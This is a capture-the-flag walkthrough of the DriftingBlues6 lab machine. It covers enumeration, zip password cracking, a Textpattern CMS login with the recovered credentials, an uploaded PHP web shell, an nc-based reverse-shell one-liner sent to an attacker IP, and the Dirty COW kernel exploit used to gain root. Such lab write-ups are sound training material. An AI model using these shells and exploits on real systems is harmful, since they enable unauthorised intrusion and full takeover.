# DriftingBlues6

| Name        | DriftingBlues6                |
| ----------- | ----------------------------- |
| Dificultad: | Easy                          |
| SO:         | Linux                         |
| Tipo:       | VulnHub - OffSec Play Grounds |

```shell
192.168.159.219
```
## Enumeration
### Nmap
```shell
nmap 192.168.159.219 -sV -sC -p- --min-rate=1000

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.2.22 ((Debian))
| http-robots.txt: 1 disallowed entry 
|_/textpattern/textpattern
|_http-server-header: Apache/2.2.22 (Debian)
|_http-title: driftingblues


sudo nmap 192.168.159.219 -p- --min-rate=1000 -sU
```
### Web Enumeration - Port 80
We just found a web page with only text and one image.
![01-DriftingBlues6](01-DriftingBlues6-10.png)
#### robots.txt
![01-DriftingBlues6-1](01-DriftingBlues6.png)
- We have two clues here. The first one a subdirectory to continue enumerating and the second one an extension to use in our directory enumeration

#### Ffuf
```shell
ffuf -w /home/kali/Documents/SecLists/Discovery/Web-Content/common.txt -u http://192.168.159.219/FUZZ.zip

ffuf -w /home/kali/Documents/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://192.168.159.219/FUZZ.zip

spammer
```

```shell
http://192.168.159.219/spammer.zip
```
- This new subdirectory allow us to download a zip file but we need a password
#### zip2John
```shell
zip2john spammer.zip > zip.hash

john --wordlist=/home/kali/Documents/rockyou.txt zip.hash

myspace4
```

```shell
unzip spammer.zip
cat creds.txt

mayer:lionheart
```

#### /textpattern/textpattern/
```shell
http://192.168.159.219/textpattern/textpattern/
```
![01-DriftingBlues6-2](01-DriftingBlues6-11.png)
- In this URL given by [#robots.txt](#robots.txt) we found a login page for Textpattern CMS. We tried some default credentials but did no worked

Let's try the credentials found in the ZIP file:
![01-DriftingBlues6-3](01-DriftingBlues6-12.png)


## Foothold
In the bottom of the logged in console we found the CMS version:
```shell
Textpattern CMS (v4.8.3)
```

### EDB-ID-48943 - TextPattern CMS 4.8.3 - RCE Authenticated
- https://www.exploit-db.com/exploits/48943
We could make this script to be execute but we can try a manual approach as showed for the version 4.8.7:
- https://www.exploit-db.com/exploits/49996
#### Web Shell
```shell
vim shell.php

<?php system($_GET['cmd']);?>
```

![01-DriftingBlues6-4](01-DriftingBlues6-13.png)

```shell
http://192.168.159.219/textpattern/files/shell.php?cmd=id
```
![01-DriftingBlues6-5](01-DriftingBlues6-14.png)

#### Reverse Shell
```shell
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 192.168.45.184 4444 >/tmp/f

http://192.168.159.219/textpattern/files/shell.php?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Cbash%20-i%202%3E%261%7Cnc%20192.168.45.184%204444%20%3E%2Ftmp%2Ff
```
#### Listener
```shell
nc -lnvp 4444
```
![01-DriftingBlues6-6](01-DriftingBlues6-15.png)


## Privilege Escalation
```shell
python -c 'import pty; pty.spawn("/bin/sh")'
```
### Basic Enumeration
- Sudo is not installed
```shell
uname -a

Linux driftingblues 3.2.0-4-amd64 #1 SMP Debian 3.2.78-1 x86_64 GNU/Linux
```
- This is an old kernel. Let's try this kind of exploit

### EDB-ID-40839 - CVE-2016-5195 - Dirty COW
- https://www.exploit-db.com/exploits/40839
#### Compiling Exploit
```shell
gcc -pthread dirty.c -o dirty -lcrypt
```

```shell
./dirty

firefart:0000
```
![01-DriftingBlues6-7](01-DriftingBlues6-16.png)

#### Shell as firefart (Root User)
```shell
su firefart
```
![01-DriftingBlues6-8](01-DriftingBlues6-17.png)

![01-DriftingBlues6-9](01-DriftingBlues6-18.png)


# Flags
```shell
/root/proof.txt
```

